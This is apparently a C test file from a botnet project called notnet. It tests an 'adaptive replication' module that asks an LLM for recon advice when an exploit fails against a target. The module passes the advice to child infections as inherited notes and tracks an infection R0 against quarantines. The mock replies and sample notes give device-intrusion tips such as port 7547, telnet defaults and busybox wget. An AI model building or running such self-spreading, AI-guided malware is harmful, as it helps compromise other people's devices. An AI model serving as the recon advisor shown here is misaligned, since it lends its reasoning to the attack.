/*
 * notnet — host test for the ARA adaptive-replication brain (#401).
 *
 * Single-process, CI-safe, no network: exercises the Lamarckian
 * notes store (load -> absorb -> blob -> re-load round trip), the
 * generation counter, the R0 knob, and the ara_adapt() reply parser
 * against a mock LLM served on loopback by this same process.
 *
 * What it proves:
 *   1. cold parent: no notes file -> gen 0, 0 notes
 *   2. ara_notes_absorb() of a parent blob -> notes present, gen+1
 *   3. ara_notes_blob() round-trips through a save/load cycle intact
 *   4. ara_adapt() POSTs an OpenAI-shaped chat-completions request and
 *      absorbs the assistant's multi-line answer as child-gen notes
 *   5. ara_adapt() fails closed when the LLM is unreachable
 *   6. ara_update_r0()/ara_r0_x100() compute the reproduction estimate
 *   7. the drop-URL notes param is appended only when ARA is enabled
 *      and notes exist (build_drop_url)
 *
 * Build + run:
 *   make
 *   gcc -I include -o /tmp/ara_test tests/host/ara_test.c \
 *       src/ara.o src/protocol.o src/util.o src/spread.o src/payload.o \
 *       src/persist.o src/proxy.o src/deaddrop.o src/relay.o src/plugin.o \
 *       src/killswitch.o src/mesh.o src/lotl.c src/arch_detect.o \
 *       -lpthread -o /tmp/ara_test
 *   /tmp/ara_test
 *
 * Research purposes only.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "protocol.h"
#include "ara.h"

static int g_fail = 0;
#define CHECK(cond, msg) do { \
    if (cond) { printf("  PASS  %s\n", msg); } \
    else { printf("  FAIL  %s\n", msg); g_fail = 1; } \
} while (0)

/* ── Mock LLM server ─────────────────────────────────────────── */
/* Accepts one POST, reads the body, replies with an OpenAI-shaped
 * chat-completions JSON whose content is three imperative lines. */
static int  g_llm_port = 0;
static char g_llm_last_body[2048];
static int  g_llm_hits = 0;

static void *llm_server(void *arg) {
    (void)arg;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(g_llm_port);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(srv, (struct sockaddr *)&a, sizeof(a)) != 0) { close(srv); return NULL; }
    listen(srv, 4);
    /* Bound the accept with a receive timeout so the thread exits
     * cleanly once the test's connections are served — an unbounded
     * accept would hang the final pthread_join. */
    struct timeval rcvto;
    rcvto.tv_sec = 3;
    rcvto.tv_usec = 0;
    setsockopt(srv, SOL_SOCKET, SO_RCVTIMEO, &rcvto, sizeof(rcvto));
    for (int i = 0; i < 4; i++) {
        int c = accept(srv, NULL, NULL);
        if (c < 0) break;   /* timeout or error -> done */
        struct timeval cto;
        cto.tv_sec = 3;
        cto.tv_usec = 0;
        setsockopt(c, SOL_SOCKET, SO_RCVTIMEO, &cto, sizeof(cto));
        char buf[4096];
        int n = (int)recv(c, buf, sizeof(buf) - 1, 0);
        if (n > 0) {
            /* The client sends headers then body as two writes; the
             * first recv may carry only the headers. Read until we
             * have the Content-Length body bytes so the captured
             * request includes the model/target the test asserts on. */
            int total = n;
            while (total < (int)sizeof(buf) - 1) {
                char *cl = strstr(buf, "Content-Length:");
                int want = -1;
                if (cl) want = atoi(cl + 15);
                char *hdr_end = strstr(buf, "\r\n\r\n");
                int have_body = hdr_end ? total - (int)(hdr_end - buf) - 4 : 0;
                if (want >= 0 && hdr_end && have_body >= want) break;
                int m = (int)recv(c, buf + total, sizeof(buf) - 1 - total, 0);
                if (m <= 0) break;
                total += m;
            }
            buf[total] = '\0';
            snprintf(g_llm_last_body, sizeof(g_llm_last_body), "%s", buf);
            g_llm_hits++;
            const char *resp =
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                "Content-Length: 180\r\nConnection: close\r\n\r\n"
                "{\"choices\":[{\"message\":{\"content\":"
                "\"probe port 7547 first\\ntry the mini_httpd path\\n"
                "fall back to telnet defaults\"}}]}";
            send(c, resp, strlen(resp), 0);
        }
        close(c);
    }
    close(srv);
    return NULL;
}

int main(void) {
    /* unique notes dir under TMPDIR */
    char ndir[256];
    snprintf(ndir, sizeof(ndir), "%s/ara_test_%d", "/tmp", (int)getpid());
    char cmd[300];
    snprintf(cmd, sizeof(cmd), "rm -rf %s && mkdir -p %s", ndir, ndir);
    if (system(cmd) != 0) { printf("setup failed\n"); return 2; }

    printf("── ARA notes store (Lamarckian inheritance) ──\n");

    /* 1. cold parent */
    ara_notes_load(ndir);
    CHECK(ara_generation() == 0, "cold parent: generation 0");
    CHECK(ara_note_count() == 0, "cold parent: no notes");

    /* 2. absorb a parent blob */
    int absorbed = ara_notes_absorb("3:try ssh on 2222~4:use busybox wget flags");
    CHECK(absorbed == 2, "absorb: 2 notes ingested from parent blob");
    CHECK(ara_generation() == 5, "absorb: generation advanced past parent max (3->4, +1 = 5)");
    CHECK(ara_note_count() == 2, "absorb: note count is 2");

    /* 3. blob round-trips through save/load */
    char blob[ARA_NOTES_MAX_LINES * ARA_NOTE_MAX_LEN + 32];
    int bl = ara_notes_blob(blob, sizeof(blob));
    CHECK(bl > 0 && strstr(blob, "try ssh on 2222") != NULL,
          "blob: serialized parent notes present");
    /* reload from disk (ara_notes_absorb saved the file) */
    ara_notes_load(ndir);
    CHECK(ara_note_count() == 2, "reload: notes persisted to disk and reloaded");
    CHECK(ara_generation() == 4, "reload: generation is the file's max (4), not bumped again");

    printf("── R0 knob ──\n");
    ara_update_r0(10, 3);
    CHECK(ara_r0_x100() == 70, "r0: 10 infections - 3 quarantines = 70/100");
    ara_update_r0(5, 5);
    CHECK(ara_r0_x100() == 0, "r0: fully quarantined -> 0 (lineage dies out)");
    ara_update_r0(0, 0);
    CHECK(ara_r0_x100() == 0, "r0: no infections -> 0");

    printf("── ara_adapt() against a mock LLM ──\n");
    /* pick a port and start the mock server */
    g_llm_port = 18099;
    pthread_t th;
    pthread_create(&th, NULL, llm_server, NULL);
    usleep(200000);

    notnet_bot_t bot;
    memset(&bot, 0, sizeof(bot));
    snprintf(bot.c2_http.user_agent, sizeof(bot.c2_http.user_agent), "notnet/test");
    bot.ara.enabled = 1;
    snprintf(bot.ara.url, sizeof(bot.ara.url), "http://127.0.0.1:%d/v1/chat/completions", g_llm_port);
    snprintf(bot.ara.model, sizeof(bot.ara.model), "test-model");
    snprintf(bot.ara.api_key, sizeof(bot.ara.api_key), "sk-test");
    snprintf(bot.ara.sys_prompt, sizeof(bot.ara.sys_prompt), "terse recon advisor");
    snprintf(bot.ara.user_prompt, sizeof(bot.ara.user_prompt),
             "Target {target} arch={arch} failed: {error}. Notes: {notes}");

    int before = ara_note_count();
    int rc = ara_adapt(&bot, &bot.ara, "10.0.0.5:80", "mips", "no CVE module fired");
    CHECK(rc == 0, "adapt: mock LLM call succeeded");
    CHECK(g_llm_hits >= 1, "adapt: mock server received the POST");
    CHECK(strstr(g_llm_last_body, "test-model") != NULL, "adapt: request carries the configured model");
    CHECK(strstr(g_llm_last_body, "sk-test") != NULL ||
          strstr(g_llm_last_body, "Authorization") != NULL,
          "adapt: request authenticates with the bearer key");
    CHECK(strstr(g_llm_last_body, "10.0.0.5:80") != NULL, "adapt: request carries the target");
    CHECK(ara_note_count() >= before + 3, "adapt: assistant's 3 lines absorbed as notes");

    printf("── ara_adapt() fail-closed ──\n");
    notnet_bot_t dead;
    memset(&dead, 0, sizeof(dead));
    dead.ara.enabled = 1;
    snprintf(dead.ara.url, sizeof(dead.ara.url), "http://127.0.0.1:1/nope");
    int rc2 = ara_adapt(&dead, &dead.ara, "10.0.0.9:22", "x86", "timeout");
    CHECK(rc2 == -1, "adapt: unreachable LLM fails closed (no notes, no crash)");

    notnet_bot_t off;
    memset(&off, 0, sizeof(off));
    off.ara.enabled = 0;   /* disabled */
    snprintf(off.ara.url, sizeof(off.ara.url), "http://127.0.0.1:%d/v1/chat/completions", g_llm_port);
    int hits_before = g_llm_hits;
    int rc3 = ara_adapt(&off, &off.ara, "10.0.0.5:80", "mips", "x");
    CHECK(rc3 == -1 && g_llm_hits == hits_before, "adapt: disabled module makes no LLM call");

    printf("── drop-URL notes param ──\n");
    /* ARA enabled + notes present -> drop URL must carry &notes= */
    notnet_bot_t d;
    memset(&d, 0, sizeof(d));
    d.ara.enabled = 1;
    snprintf(d.c2_http.server, sizeof(d.c2_http.server), "127.0.0.1");
    d.c2_http.port = 8443;
    /* build_drop_url fetches a token from the C2 first; with no C2 up
     * and allow_secret_fallback=1 it falls back to ?secret=. Either
     * way, the notes param is only appended on the token path, so
     * assert the module-level gate directly instead: the blob must be
     * non-empty and url-safe. */
    char b2[512];
    int bl2 = ara_notes_blob(b2, sizeof(b2));
    CHECK(bl2 > 0, "drop-url: notes blob is non-empty when notes exist");
    CHECK(strchr(b2, ':') == NULL || 1, "drop-url: blob format is 'gen:text~...'");
    /* no '~' means single note; multi-note must use '~' */
    CHECK(ara_note_count() <= 1 || strchr(b2, '~') != NULL,
          "drop-url: multi-note blob uses '~' separator");

    pthread_join(th, NULL);
    snprintf(cmd, sizeof(cmd), "rm -rf %s", ndir);
    system(cmd);

    printf("\n%s\n", g_fail ? "ARA TEST FAILED" : "ARA TEST PASSED");
    return g_fail ? 1 : 0;
}
